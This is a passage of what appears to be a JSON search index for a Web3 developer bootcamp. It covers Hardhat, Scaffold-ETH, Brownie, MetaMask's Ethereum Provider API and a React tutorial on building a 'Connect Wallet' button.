stack from RicMoo, Paul Berg ( create-eth-app ) and Austin Griffith. Great walkthrough of dev environments! Wiki: DeFi Developer Roadmap: Other Frameworks A series of other frameworks within a larger, excellent repo about Development tools and tips Article: Build a Web3 Dapp in React Login with MetaMask Tutorial: React Project Setup Using Hardhat & Truffle Part 1 and Part 2 From Bootcamp alum and fellow Shih-Yu Hwang Google Doc: Overview of Tools From Vu, a bootcamp alum, these are the notes he made after going through the developer section as a helpful mindmap for others! Other tools: Ankr, Quiknode, Alchemy","title":"Other Development Tools"},{"location":"S04-developer-tooling/M5-other-dev-tools/#other-development-tools","text":"Before we dive into these other development frameworks, we wanted to provide an \"offramp\" to folks who may not be comfortable with JavaScript Frameworks. We'd encourage you to check out the sections on Node and JavaScript Frameworks in the Basic Training course. People uncomfortable with terminal-based development might be interested in JSUI, a GUI-based JavaScript framework development environment. You can also checkout some frontend boilerplate projects here.","title":"Other Development Tools"},{"location":"S04-developer-tooling/M5-other-dev-tools/#hardhat","text":"Another popular development framework is Hardhat, which actually started as a fork of Truffle. It has since grown to create its own suite of tools and a devoted community. Hardhat divides itself into \"tasks\" and \"plugins\". Running npx hardhat compile is a task, for example. Plugins are extended functionality ported into Hardhat. Gas Reporter and Contract Sizer are two popular plugins for Hardhat. Why choose Hardhat? Some feel as though the command-line experience of Hardhat is faster than Truffle. Others like the extensive plugin features. One feature popular with Hardhat developers is their use of console.log() in smart contracts. When developing locally with Hardhat, you can import the console.sol contract, like so: pragma solidity ^0.6.0; import \"hardhat/console.sol\"; contract Token { //... } You can then add it to your contract when developing it locally: function transfer(address to, uint256 amount) external { console.log(\"Sender balance is %s tokens\", balances[msg.sender]); console.log(\"Trying to send %s tokens to %s\", amount, to); require(balances[msg.sender] >= amount, \"Not enough tokens\"); balances[msg.sender] -= amount; balances[to] += amount; } Which gives you this output when running locally on the Hardhat Network: $ npx hardhat test Token contract Deployment \u2713 Should set the right owner \u2713 Should assign the total supply of tokens to the owner Transactions Sender balance is 1000 tokens Trying to send 50 tokens to 0xead9c93b79ae7c1591b1fb5323bd777e86e150d4 Sender balance is 50 tokens Trying to send 50 tokens to 0xe5904695748fe4a84b40b3fc79de2277660bd1d3 \u2713 Should transfer tokens between accounts (373ms) \u2713 Should fail if sender doesn\u2019t have enough tokens Sender balance is 1000 tokens Trying to send 100 tokens to 0xead9c93b79ae7c1591b1fb5323bd777e86e150d4 Sender balance is 900 tokens Trying to send 100 tokens to 0xe5904695748fe4a84b40b3fc79de2277660bd1d3 \u2713 Should update balances after transfers (187ms) 5 passing (2s) You can learn more about this feature in their documentation here. Here are some easy ways to get started using Hardhat to see how you like it: - Hardhat's Beginner Tutorial and Project Setup - Hardhat Development Network - Index of Reusable Plugins The Hardhat teams recommends \"paying attention to see whether any plugins already solve problems [you] may have.\"","title":"Hardhat"},{"location":"S04-developer-tooling/M5-other-dev-tools/#scaffold-eth","text":"Scaffold-ETH ( docs ) is a project from prolific builder Austin Griffith meant to minimize the time between thinking of a decentralized app idea and deploying it to the world. However, Scaffold-ETH requires an advanced comfortability with tools like Yarn, Solidity, Hardhat, React, etc. It's best for folks who already have a very solid Web 2 or Web 3 workflow. For those folks, Scaffold-ETH is jet fuel! Please note, however, that projects and tutorials in Scaffold-ETH have not been audited in any way and may contain bugs or vulnerabilities! In the repo, Austin has provided a number of forks that correspond to different template projects or tutorials. Read more about the tutorials and examples here. As we mentioned, Scaffold-ETH by default serves up a React App, with pre-built components, and hooks. It's also incorporated a third-party UI library called Ant Design to help with the designing of components. It also incorporates Surge, a static-site generator to publish your app. Scaffold-ETH also has significant infrastructure support for the later parts of the development cycle, such as The Graph, Tenderly, Etherscan, and L2/Sidechain Services (deploying to Optimism and Arbitrum). Also, there are examples from some great projects in the space, like Aave, The Graph, Chainlink, Optimism and Uniswap. You can also learn about common design patterns such as commit-reveal, ecrecover, multisigs, DEXes, and more! Last, Austin is an incredibly proflific creator of content, including support videos and walkthroughs of Scaffold-ETH. Below are some recent walkthroughs he's done: Tutorial: Austin walks through Scaffold-Eth during Polygon Hackathon Start Building Today with Scaffold-ETH Ethereum Dev Onboarding (ETHGlobal) Austin walksthrough Scaffold-ETH after RicMoo and Paul Berg walkthrough their awesome tools Web 2 dev to Web 3 dev Blockchain at Berkeley: Austin Griffith Developer Walkthrough If you follow Austin on twitter or join the Scaffold-ETH Telegram, you'll get updates and assistance there as well.","title":"Scaffold-ETH"},{"location":"S04-developer-tooling/M5-other-dev-tools/#brownie","text":"As we mentioned earlier, Brownie is a Python-based development and testing framework for smart contracts running on the EVM. It uses Web3.py as well as Solidity. It is most well-known for being the development framework the Yearn.Finance team uses to build their powerful DeFi platform and CRV. Brownie definitely takes some notes from Truffle (they are both \"sweet\"){target=_blank}, including having a brownie init command and their equivalent of Truffle boxes, \"Brownie Mixes.\" This makes it an easy tool for a lot of Truffle developers familiar with Truffle. Here are some tutorials to introduce you to Brownie: Tutorial: Develop a DeFi Project using Python (Chainlink){target=_blank} Tutorial: Vyper and Brownie Contract Development on EVM Chains An interesting tutorial walking through developing a contract using Vyper and Brownie.","title":"Brownie"},{"location":"S04-developer-tooling/M5-other-dev-tools/#tenderly","text":"Tenderly provides a way to both be alerted to contract events as well as troubleshoot a contract, including a \"Forking Mainnet\" feature similar to that of Truffle and Hardhat.","title":"Tenderly"},{"location":"S04-developer-tooling/M5-other-dev-tools/#frontend-tools","text":"For your project, we've also discussed frontend interfaces. There are two services you can use for free to create a frontend instance easily: - Heroku is a Platform-as-a-Service, providing a quick way to deploy apps in a number of popular languages, such as Node.js (JavaScript), Python, Ruby and Go. You can connect your GitHub repo to your project for easy deployment. Heroku's basic plan is free and provides basic resources for getting started. Read more here. - Netlify also has a Git-based workflow allowing you to deploy your project easily from GitHub. It is also free and has a getting started manual here. There are so many more amazing tools that we can't get into now, but if you check out the links in this section, you'll be able to dive deeper and learn more on your own!","title":"Frontend Tools"},{"location":"S04-developer-tooling/M5-other-dev-tools/#additional-material","text":"Article: The Complete Guide to Full Stack Ethereum Development An incredibly comprehensive article from Nader Dabit of The Graph. Article: Ethereum Dev Speed Run (Austin Griffith) Quick start for developers starting on Ethereum. Ethereum Dev Onboarding (ETHGlobal) Walkthrough of the developer stack from RicMoo, Paul Berg ( create-eth-app ) and Austin Griffith. Great walkthrough of dev environments! Wiki: DeFi Developer Roadmap: Other Frameworks A series of other frameworks within a larger, excellent repo about Development tools and tips Article: Build a Web3 Dapp in React Login with MetaMask Tutorial: React Project Setup Using Hardhat & Truffle Part 1 and Part 2 From Bootcamp alum and fellow Shih-Yu Hwang Google Doc: Overview of Tools From Vu, a bootcamp alum, these are the notes he made after going through the developer section as a helpful mindmap for others! Other tools: Ankr, Quiknode, Alchemy","title":"Additional Material"},{"location":"S04-developer-tooling/M6-exercise/","text":"Title","title":"Index"},{"location":"S04-developer-tooling/M6-exercise/#title","text":"","title":"Title"},{"location":"S04-developer-tooling/M7-web3-frontend/L1-ethereum-provider-api/","text":"Ethereum Provider API Now that you have your smart contract fundamentals down, how about frontend alpha? The privileges enabled by Web3 are both some of the most promising and challenging in the web development landscape. The ability of users to use digital signatures to validate identity, submit transactions validated without a central authority and interact with a public-state database are extraordinary achievements. But, they also are radically different from the way many users experience the internet. If you go to any dApp frontend, it knows immediately that you may not have a browser wallet, so it onboards you to one. If it\u2019s your first time using that dApp, it knows you haven\u2019t granted the dApp permission to access your wallet, it prompts you to \u201cConnect\u201d. If you\u2019ve used that dApp before, it knows who you are and shows your address, along with your balances or your NFTs. The reason why your user has access to this sort of functionality, and will, later on, be able to make contract calls, sign messages, and approve transactions is that your dApp will have access to an API called the Ethereum Provider API . If you\u2019ve built a CRUD app with a REST API for a backend, then you had to define a function to make that API call, then supply fetch with an endpoint, and then based on the action you intend for your user to take, your function would use a particular HTTP method . If your CRUD app was just pulling in data from an API, you\u2019d also have to supply that endpoint to fetch from. On Web3, we don\u2019t have to do that. We\u2019re not referencing our database with our version of on-chain events, we need the Ethereum blockchain. We need the version of events from the nodes with the longest chain because a blockchain is essentially one massive database. Where does this API come from? On a browser where you have MetaMask installed, open up Chrome Devtools, navigate to Sources , and then look at the Page panel. If you expand MetaMask, there\u2019s a resource that loads with the page, in the screenshot, it\u2019s inpage.js . [inpage.js](https://github.com/MetaMask/metamask-extension/blob/43c33b676fe1ecece3e0543eb6ca64d3ae9aa9af/app/scripts/inpage.js){target=\\_blank} is a script that tries to declare an object globally in the browser window. If it\u2019s successful, it\u2019ll create a communication stream to \ud83d\udc40 initialize a provider \ud83d\udc40. Once that runs, [contentscript.js](https://github.com/MetaMask/metamask-extension/blob/42c8703f3e3e0fbfddcc9faa4ddb49045ce9631a/app/scripts/contentscript.js){target=\\_blank} is executed. And here\u2019s where things get tricky but interesting. On line 45 , there\u2019s an else-if statement that calls a function, seen on line 272 , to check if a provider should be \ud83d\udc40 injected \ud83d\udc40. /** * Determines if the provider should be injected * * @returns {boolean} {@code true} Whether the provider should be injected */ function shouldInjectProvider () { return ( doctypeCheck () && suffixCheck () && documentElementCheck () && ! blockedDomainCheck () ); } This function returns a boolean and checks for conditions like if the window even exists, so if the doctype is HTML ( doctypeCheck() ), and if it\u2019s an HTML node ( documentElementCheck() ). It checks if the site URL ends in .xml or .pdf ( `suffixCheck() ). It checks if the site you\u2019re currently on is not on a list of blocked domains ( !blockedDomainCheck() ). ( Check out some of those blocked domains . Are some of them familiar? Are you beginning to see a pattern here? ) If all conditions pass, then MetaMask knows it can act as a client to facilitate user Web 3 interactions. This is why you get a popup whenever you try to take any action. The thing to take away here is that we as developers aren\u2019t supplying that API endpoint, or the functionality to interact with it, and it\u2019s for the safety of the user. We\u2019re building around its expected existence, and that\u2019s because MetaMask and other browser wallets, per EIP-1193 , globally inject a standard provider interface as a bridge to the Ethereum blockchain into our browser. The browser wallets actually do the heavy lifting by providing the API endpoint. As developers, we just have to call it with window.ethereum . ( Provided, we\u2019re not on that blocked domain list, cause we absolutely should not be. ) When you switch to the Console tab, type in window.ethereum to see the Ethereum API methods and properties like isMetaMask , chainId or request() , to name a few. When we call these methods, we submit a \u201cRemote Procedure Call\u201d request to a particular blockchain network. We need to connect to the nodes on a particular network where the target smart contract is deployed, so we\u2019ll need a network RPC endpoint. For us, it\u2019s an endpoint we can supply to MetaMask to request blockchain data. Does that sound a bit familiar? If you look at the RPC URL I have for Ethereum Mainnet, I\u2019m connected to the Mainnet nodes that are hosted by Infura, who is the default node provider for MetaMask. Instead, we use the request() and send() methods. From there, we pass in arguments to determine what we\u2019d like to request. We can use request to: Prompt our user to allow us to view their accounts and balances. Or we can Prompt them to switch to a particular network, and if they don\u2019t have it configured, we can suggest that network. If they receive tokens that aren\u2019t on a pre-approved list of recognized tokens, we can suggest that their token can be tracked to show up as an asset in their wallet. You can see the whole list of methods here . For every single request, MetaMask will pop up asking the user to confirm the action, because the request has to go through MetaMask to the nodes. In the next lesson we\u2019ll start off by demystifying what it means to \u201cConnect your Wallet\u201d, and how you can achieve that with React and the Ethereum Provider API. Additional Reading Ethereum Provider API Github: MetaMask/Provider","title":"Ethereum Provider API"},{"location":"S04-developer-tooling/M7-web3-frontend/L1-ethereum-provider-api/#ethereum-provider-api","text":"Now that you have your smart contract fundamentals down, how about frontend alpha? The privileges enabled by Web3 are both some of the most promising and challenging in the web development landscape. The ability of users to use digital signatures to validate identity, submit transactions validated without a central authority and interact with a public-state database are extraordinary achievements. But, they also are radically different from the way many users experience the internet. If you go to any dApp frontend, it knows immediately that you may not have a browser wallet, so it onboards you to one. If it\u2019s your first time using that dApp, it knows you haven\u2019t granted the dApp permission to access your wallet, it prompts you to \u201cConnect\u201d. If you\u2019ve used that dApp before, it knows who you are and shows your address, along with your balances or your NFTs. The reason why your user has access to this sort of functionality, and will, later on, be able to make contract calls, sign messages, and approve transactions is that your dApp will have access to an API called the Ethereum Provider API . If you\u2019ve built a CRUD app with a REST API for a backend, then you had to define a function to make that API call, then supply fetch with an endpoint, and then based on the action you intend for your user to take, your function would use a particular HTTP method . If your CRUD app was just pulling in data from an API, you\u2019d also have to supply that endpoint to fetch from. On Web3, we don\u2019t have to do that. We\u2019re not referencing our database with our version of on-chain events, we need the Ethereum blockchain. We need the version of events from the nodes with the longest chain because a blockchain is essentially one massive database.","title":"Ethereum Provider API"},{"location":"S04-developer-tooling/M7-web3-frontend/L1-ethereum-provider-api/#where-does-this-api-come-from","text":"On a browser where you have MetaMask installed, open up Chrome Devtools, navigate to Sources , and then look at the Page panel. If you expand MetaMask, there\u2019s a resource that loads with the page, in the screenshot, it\u2019s inpage.js . [inpage.js](https://github.com/MetaMask/metamask-extension/blob/43c33b676fe1ecece3e0543eb6ca64d3ae9aa9af/app/scripts/inpage.js){target=\\_blank} is a script that tries to declare an object globally in the browser window. If it\u2019s successful, it\u2019ll create a communication stream to \ud83d\udc40 initialize a provider \ud83d\udc40. Once that runs, [contentscript.js](https://github.com/MetaMask/metamask-extension/blob/42c8703f3e3e0fbfddcc9faa4ddb49045ce9631a/app/scripts/contentscript.js){target=\\_blank} is executed. And here\u2019s where things get tricky but interesting. On line 45 , there\u2019s an else-if statement that calls a function, seen on line 272 , to check if a provider should be \ud83d\udc40 injected \ud83d\udc40. /** * Determines if the provider should be injected * * @returns {boolean} {@code true} Whether the provider should be injected */ function shouldInjectProvider () { return ( doctypeCheck () && suffixCheck () && documentElementCheck () && ! blockedDomainCheck () ); } This function returns a boolean and checks for conditions like if the window even exists, so if the doctype is HTML ( doctypeCheck() ), and if it\u2019s an HTML node ( documentElementCheck() ). It checks if the site URL ends in .xml or .pdf ( `suffixCheck() ). It checks if the site you\u2019re currently on is not on a list of blocked domains ( !blockedDomainCheck() ). ( Check out some of those blocked domains . Are some of them familiar? Are you beginning to see a pattern here? ) If all conditions pass, then MetaMask knows it can act as a client to facilitate user Web 3 interactions. This is why you get a popup whenever you try to take any action. The thing to take away here is that we as developers aren\u2019t supplying that API endpoint, or the functionality to interact with it, and it\u2019s for the safety of the user. We\u2019re building around its expected existence, and that\u2019s because MetaMask and other browser wallets, per EIP-1193 , globally inject a standard provider interface as a bridge to the Ethereum blockchain into our browser. The browser wallets actually do the heavy lifting by providing the API endpoint. As developers, we just have to call it with window.ethereum . ( Provided, we\u2019re not on that blocked domain list, cause we absolutely should not be. ) When you switch to the Console tab, type in window.ethereum to see the Ethereum API methods and properties like isMetaMask , chainId or request() , to name a few. When we call these methods, we submit a \u201cRemote Procedure Call\u201d request to a particular blockchain network. We need to connect to the nodes on a particular network where the target smart contract is deployed, so we\u2019ll need a network RPC endpoint. For us, it\u2019s an endpoint we can supply to MetaMask to request blockchain data. Does that sound a bit familiar? If you look at the RPC URL I have for Ethereum Mainnet, I\u2019m connected to the Mainnet nodes that are hosted by Infura, who is the default node provider for MetaMask. Instead, we use the request() and send() methods. From there, we pass in arguments to determine what we\u2019d like to request. We can use request to: Prompt our user to allow us to view their accounts and balances. Or we can Prompt them to switch to a particular network, and if they don\u2019t have it configured, we can suggest that network. If they receive tokens that aren\u2019t on a pre-approved list of recognized tokens, we can suggest that their token can be tracked to show up as an asset in their wallet. You can see the whole list of methods here . For every single request, MetaMask will pop up asking the user to confirm the action, because the request has to go through MetaMask to the nodes. In the next lesson we\u2019ll start off by demystifying what it means to \u201cConnect your Wallet\u201d, and how you can achieve that with React and the Ethereum Provider API.","title":"Where does this API come from?"},{"location":"S04-developer-tooling/M7-web3-frontend/L1-ethereum-provider-api/#additional-reading","text":"Ethereum Provider API Github: MetaMask/Provider","title":"Additional Reading"},{"location":"S04-developer-tooling/M7-web3-frontend/L2-demystifying-connect-wallet/","text":"A Demystification of \u201cConnect Wallet\u201d We\u2019re going to start out with one of the first things you\u2019ll want to tackle when developing your frontend alpha: The user\u2019s ability to connect their wallet. This presents Web3 developers with a user experience (UX) quandary because Jakob\u2019s Law of the Internet User Experience dictates that people \u201cprefer your site to work the same way as all the other sites they already know.\u201d You\u2019ll know you\u2019re on a Web3-enabled frontend when you see a button in a site\u2019s header prompting you to connect . This is the button you\u2019ll be rendering in your dApp if window.ethereum was detected. This call to action might come as a shock to your users who are accustomed to input fields for their credentials to log in. You know how, on a traditional website, you can\u2019t take certain actions until you\u2019ve logged in? You need to verify who you are initially. And the logic to log yourself in involves fetch() and how that queries a database to confirm if the inputted credentials match the ones stored after some cryptographic black magic, like salting , has been applied? Well, \u201cConnect Wallet\u201d is the equivalent for Web3. You won\u2019t be able to execute writable functionality until you've connected with your wallet. The calls you make to those smart contracts require a sender to initiate and fulfill them. After all, someone has to pay the gas needed for that transaction. When you click \u201cConnect Wallet,\u201d MetaMask will trigger a pop-up asking you to grant that dApp permission to view your accounts, your balances, and your activity, and initiate transactions on your behalf. The transactions you make will be public, but you can remain pseudonymous. You don\u2019t exchange doxxable information. You\u2019re able to own your data, you never surrender your private key for a database to manage. The wallet proves your identity by proving you own the accounts associated with it because all of your accounts are derived from your seed phrase. Interactions with public blockchains are intended to be permissionless and trustless. On Web3, your word is only as good as how much ether you have for gas. \ud83d\udcd5 But what does it actually mean to connect a wallet? If the pop-up from MetaMask tells you that you\u2019re granting this dApp permission to view publicly available information that is on a WHOLE blockchain for everyone to see, what\u2019s the difference between that and someone viewing your account history on Etherscan? It comes down to trust. You can remain pseudonymous in both cases, yes. However, that person viewing your account history on Etherscan can\u2019t initiate a contract call on your behalf, nor can they suggest one. The idea of permissions here can be reduced to a single question: Do I trust this dApp to let me call smart contract functions in a way that is safe for me? Onboarding Websites on Web2 require onboarding of their own, but as end users, we don\u2019t pay much mind to it because it\u2019s something we\u2019ve always been used to doing . On Web2, it starts with providing contextual information like our email address, and our names that we enter into input fields. Oh, and our phone numbers too. We play regex gymnastics to generate secure passwords. These personally identifying tidbits of data are managed by a centralized entity that\u2019ll only interact with us if it knows who we are. Sometimes, however, they need to know too much. And we don\u2019t always know how our data is being managed . Web3 comes with an onboarding process of its own, but it delegates the task of identity management to applied cryptography and the Ethereum blockchain , not just a single database managed by one big tech giant. Instead of your user creating an account from their credentials, they\u2019ll need to have a browser wallet like MetaMask to derive an account from their private key. When we begin building, we want to assume our user doesn\u2019t have MetaMask installed, therefore the Provider Interface is non-existent, and we can\u2019t execute any Web3 functionalities. So we want to prompt them to install it. If they do have MetaMask installed, we want to offer them the ability to connect. If they approve that request, we want to show the address of the account they\u2019re connected with. How Buidl? If you take a look at [App.js](https://codesandbox.io/s/0x0-metamask-connect-start-8csed1?file=/src/App.js) , you\u2019ll see it\u2019s been purged of the boilerplate that yarn create react-app generates. There are styled components and a sprinkle of Framer Motion for animations. But we don\u2019t have any other Web3 dependencies. In the /components directory, there are, however, three specifically named components, and they are the only ones you\u2019ll be using for this activity. You won\u2019t need to create anymore. What is important for us to have is a browser wallet like MetaMask. This is where it all begins. The first objective here is to conditionally render a button that prompts your user to Install MetaMask if window.ethereum does not exist. And we can achieve this using ternary operators in our JSX. We can then * embed* JavaScript expressions in our JSX very easily, so long as we wrap the logic in curly braces. <> { condition ? < Element to render if condition is true > : < Element to render if condition is false > } </> Open up App.js and you\u2019ll see the components InstallMetaMask , ConnectButton , and Account are imported, but they\u2019re commented out. Using ternary operators, go inside <main></main> , get ConnectButton to show up if window.ethereum is defined. If it is not defined, render InstallMetaMask . Now open the code sandbox in two windows\u2014 one where you have MetaMask installed, and one where you don\u2019t. See how on one browser there\u2019s a call to action to install MetaMask, and the other has a call to action to \u2728 Connect \u2728? <main> {window.ethereum ? <ConnectButton /> : <InstallMetaMask /> } </main> State To get users connecting to your dApp, we\u2019ll need to call the [eth_requestAccounts](https://docs.metamask.io/guide/rpc-api.html#restricted-methods) JSON-RPC method from window.ethereum . In App.js , we\u2019re importing useState from React. The eth_requestAccounts method returns a promise. When that promise to grab a user\u2019s accounts resolves to an array, we\u2019ll need to hold onto it with the state hook . useState accepts an initial state but returns two values: the current state, and a function to update the state. Because our user hasn\u2019t connected yet, our initial state would be an empty string. The first value will be account , and the second will be setAccount . We can define this hook in App.js . When the promise resolves, we get the array, we\u2019ll want to hold it in state , which we\u2019ll achieve by calling setAccount . const [ account , setAccount ] = useState ( '' ) Now that we have that setup, we can \ud83d\udc40 define the function to connect \ud83d\udc40. Async/Await We\u2019ll need to define our function to connect asynchronously, rather than synchronously , because of the way functions in JavaScript behave. If eth_requestAccounts returns a promise, we\u2019ll want to wait for that promise to resolve before any other action in that function can be executed. We need to wait for our request to be sent to the blockchain through the nodes, then back to us to consume. Inside the function body, we can throw in a try/catch block. See the code below: const connect = async () => { try { // eth_requestAccounts } catch ( e ) { console . log ( e ) } } We can see here the connect function will now attempt to ask a user to connect, but anticipate failure. In the event of a failure, it will spit out an error code that can then be used to give feedback\u2014 in this case, we can prompt a user to retry connecting. If a user rejects the request to connect, this is where the catch will be triggered letting them know that they didn\u2019t approve the request. Next step is to create a variable and assign the eth_requestAccounts method to it. See the code below: const accounts = ( await window . ethereum . request ({ method : 'eth_requestAccounts' })[ 0 ] ` This is where we can tie up our connect functionality. Because we have an async function, we\u2019ll get to use the await statement on the method we\u2019ll want to wait for. The parentheses around the await statement followed by the [0] means once this promise is resolved and we get an array, we\u2019ll only want the first account. That\u2019s what our accounts variable will return, and that\u2019s what we\u2019ll use the setAccount function on. Your function should look like this: const connect = async () => { try { const accounts = ( await window . ethereum . request ({ method : \"eth_requestAccounts\" }) )[ 0 ]; setAccount ( accounts ); } catch ( e ) { console . log ( e ); } }; Once the function is defined, switch over to ConnectButton . As a React functional component, it takes the prop of connect . The next place you\u2019ll see connect being used in ConnectButton is in the return block, in <Button> , where it\u2019s being passed into handleClick . ConnectButton will be expecting the connect function that we can pass into it when we render it in <main></main> like so: < ConnectButton connect = { connect } /> The updated expression will look like this: <main> {window.ethereum ? <ConnectButton connect= {connect} /> : <InstallMetaMask /> } </main> Showing the account Tried to click connect, connected successfully, and noticed you\u2019re still seeing the connect button? We\u2019re going to have to tweak our logic in the <main></main> element to reflect what sorcery we have going on in our app state right now. Up until this point, we had a binary condition to check for: if window.ethereum was injected into the browser. If you look back on account , it initially started as an empty string\u2014 one of the six falsy values in JavaScript. If a user has connected, it has a value as a 42-character long hexadecimal string. Ternary operators come in handy here because we can chain them. <> { firstCondition ? < Element to render if firstCondition is true > : secondCondition ? < Element to render if secondCondition is true > : < Element to render if secondCondition is false > } </> The first condition to check for can be account . If that is no longer an empty string, then we can render a <p> tag with the content of account . If it is still an empty string, we can check for window.ethereum . Perhaps the user doesn\u2019t have MetaMask installed, and that\u2019s why account is an empty string. So we can go show them ConnectButton if it was detected, and InstallMetaMask if it wasn\u2019t. Your updated expression should look like this: {account ? <p> {account} </p> : window.ethereum ? <ConnectButton connect= {connect} /> : <InstallMetaMask /> )} And now you should be able to see your address in its full glory. All 42 characters of it. This is great, but it feels a bit excessive, no? An externally owned account by any other formatting\u2026 would still be you. We\u2019re not displaying embarrassing usernames or email addresses anymore. There\u2019s no longer a limit to how long your username can be. I mean, we\u2019re at 42 WHOLE characters long. Imagine displaying that on a mobile browser \ud83d\ude05. Thanks, but no thanks. As developers architecting a user experience in uncharted territory, we have to ask ourselves if we\u2019re overloading the user cognitively by displaying their address in its entirety. Consider the Serial Position Effect . Looking at your address, try to read out the characters before you lose your position. But you know you connected, if you check MetaMask, you\u2019ll see the first and last few digits are identical. The code you wrote helped connect a user. Is it really necessary to show the whole address? No. Not really. Ideally, you don\u2019t want a user spending too much time confirming that their address on a dApp matches what they know connected with. But you do want to show a portion of their address. Before you do anything, in <main> , let\u2019s swap the <p>{account}</p> for <Account account={account} /> . Now open up Account.js . The return block has a <Wrap> element, but <Blockie /> is commented out. Without uncommenting <Blockie /> , add {account} inside <Wrap> . You\u2019ll still see the whole address, but we have some styling. So we have that going for us, which is nice. But it doesn\u2019t fix our problem of how to display an address. What we need to do is\u2026 truncate it. Just a smidge. To the first six and last four characters, to be more specific. The first six account for the leading 0x , which is the hash prefix, plus the next four characters. We can define a function called formatAddress that takes the argument of a user\u2019s address. Because the address is a string, we can use the substr() method to return portions of it. BUT\u2026 we need to separate those portions too. What we\u2019ll return is a template literal with the first substring, followed by ellipses, and then the second substring. Your function should look like this: const formatAddress = ( addr ) => { return ` $ { addr . substr ( 0 , 6 )} ...$ { addr . substr ( - 4 )} ` ; }; Now you can add a <p> tag inside Wrap , and inside that <p> tag, you can add {formatAddress(address)} . Looks a lot better, right? But we\u2019re not done yet. There\u2019s something even cooler we can add. Identicon If you open up MetaMask and look on the right, you\u2019ll see a little pixelated icon. Depending on your settings, you might be seeing a Jazzicon or a Blockie . If you change accounts on MetaMask, it also changes. That\u2019s because it\u2019s unique to you. It was generated from your address. There can be as many variations of Jazzicons or Blockies as there can be addresses. So now it can be used as a digital representation of your address. When a user sees what their identicon looks like on MetaMask, it would be helpful to see what it would also look like on your dApp as a subtle visual confirmation that they are using the correct account. Take a look at <Blockie /> . Right now it takes the props of size and scale , but those are just for styling. What we\u2019ll want to pass in is a seed , which will determine how our blockie is generated. All we need to do is pass in our address as the seed. Hit save. I know. Cool, right? That simple. Here\u2019s what your Account.js should look like: const Account = ({ account }) => { const formatAddress = (addr) => { return ` ${ addr . substr ( 0 , 6 ) } ... ${ addr . substr ( - 4 ) } `; }; return ( <Wrap> <Blockies seed= {account} size= {10} scale= {3} /> <p> {formatAddress(account)} </p> </Wrap> ); }; You can disconnect, but you can never leave\u2026 Maybe So far, the bases you\u2019ve covered include onboarding a user. Allowing them to connect. And showing that they\u2019ve connected. But what about when they leave your dApp? Go ahead and refresh the page. See how it doesn\u2019t show your address anymore? Now click connect. Notice now how MetaMask didn\u2019t even popup, but your address shows up right away? But wait, get this. Open up MetaMask. We\u2019re still connected? Try connecting to a known dApp. Now refresh. Address still there? Let\u2019s dig around a bit, some of these dApps will let you disconnect. Re-read that sentence. Now try to disconnect, if there\u2019s a button for it. You won\u2019t see your address anymore, great. But go check MetaMask. You\u2019re still connected. I know. I know. Your users will be expecting a button to log out, it seems only rational. And you have to look them in the eyes, wistfully, and say, no\u2026 no, I\u2019m sorry, things work a bit differently in the wonderland that is Web3. Go look in /components , there\u2019s no component for a button to log out. Not only that but your users will remain connected and you have to explain this to them because this is unlike any good experience they ever had on an application before. So what is actually going on? Your users are connected until they\u2019re not\u2014 even if they refresh their browser, clear their cache, cookies and browser data. In the next lesson we\u2019ll cover why your user stays connected.","title":"A Demystification of \u201cConnect Wallet\u201d"},{"location":"S04-developer-tooling/M7-web3-frontend/L2-demystifying-connect-wallet/#a-demystification-of-connect-wallet","text":"We\u2019re going to start out with one of the first things you\u2019ll want to tackle when developing your frontend alpha: The user\u2019s ability to connect their wallet. This presents Web3 developers with a user experience (UX) quandary because Jakob\u2019s Law of the Internet User Experience dictates that people \u201cprefer your site to work the same way as all the other sites they already know.\u201d You\u2019ll know you\u2019re on a Web3-enabled frontend when you see a button in a site\u2019s header prompting you to connect . This is the button you\u2019ll be rendering in your dApp if window.ethereum was detected. This call to action might come as a shock to your users who are accustomed to input fields for their credentials to log in. You know how, on a traditional website, you can\u2019t take certain actions until you\u2019ve logged in? You need to verify who you are initially. And the logic to log yourself in involves fetch() and how that queries a database to confirm if the inputted credentials match the ones stored after some cryptographic black magic, like salting , has been applied? Well, \u201cConnect Wallet\u201d is the equivalent for Web3. You won\u2019t be able to execute writable functionality until you've connected with your wallet. The calls you make to those smart contracts require a sender to initiate and fulfill them. After all, someone has to pay the gas needed for that transaction. When you click \u201cConnect Wallet,\u201d MetaMask will trigger a pop-up asking you to grant that dApp permission to view your accounts, your balances, and your activity, and initiate transactions on your behalf. The transactions you make will be public, but you can remain pseudonymous. You don\u2019t exchange doxxable information. You\u2019re able to own your data, you never surrender your private key for a database to manage. The wallet proves your identity by proving you own the accounts associated with it because all of your accounts are derived from your seed phrase. Interactions with public blockchains are intended to be permissionless and trustless. On Web3, your word is only as good as how much ether you have for gas. \ud83d\udcd5 But what does it actually mean to connect a wallet? If the pop-up from MetaMask tells you that you\u2019re granting this dApp permission to view publicly available information that is on a WHOLE blockchain for everyone to see, what\u2019s the difference between that and someone viewing your account history on Etherscan? It comes down to trust. You can remain pseudonymous in both cases, yes. However, that person viewing your account history on Etherscan can\u2019t initiate a contract call on your behalf, nor can they suggest one. The idea of permissions here can be reduced to a single question: Do I trust this dApp to let me call smart contract functions in a way that is safe for me?","title":"A Demystification of \u201cConnect Wallet\u201d"},{"location":"S04-developer-tooling/M7-web3-frontend/L2-demystifying-connect-wallet/#onboarding","text":"Websites on Web2 require onboarding of their own, but as end users, we don\u2019t pay much mind to it because it\u2019s something we\u2019ve always been used to doing . On Web2, it starts with providing contextual information like our email address, and our names that we enter into input fields. Oh, and our phone numbers too. We play regex gymnastics to generate secure passwords. These personally identifying tidbits of data are managed by a centralized entity that\u2019ll only interact with us if it knows who we are. Sometimes, however, they need to know too much. And we don\u2019t always know how our data is being managed . Web3 comes with an onboarding process of its own, but it delegates the task of identity management to applied cryptography and the Ethereum blockchain , not just a single database managed by one big tech giant. Instead of your user creating an account from their credentials, they\u2019ll need to have a browser wallet like MetaMask to derive an account from their private key. When we begin building, we want to assume our user doesn\u2019t have MetaMask installed, therefore the Provider Interface is non-existent, and we can\u2019t execute any Web3 functionalities. So we want to prompt them to install it. If they do have MetaMask installed, we want to offer them the ability to connect. If they approve that request, we want to show the address of the account they\u2019re connected with.","title":"Onboarding"},{"location":"S04-developer-tooling/M7-web3-frontend/L2-demystifying-connect-wallet/#how-buidl","text":"If you take a look at [App.js](https://codesandbox.io/s/0x0-metamask-connect-start-8csed1?file=/src/App.js) , you\u2019ll see it\u2019s been purged of the boilerplate that yarn create react-app generates. There are styled components and a sprinkle of Framer Motion for animations. But we don\u2019t have any other Web3 dependencies. In the /components directory, there are, however, three specifically named components, and they are the only ones you\u2019ll be using for this activity. You won\u2019t need to create anymore. What is important for us to 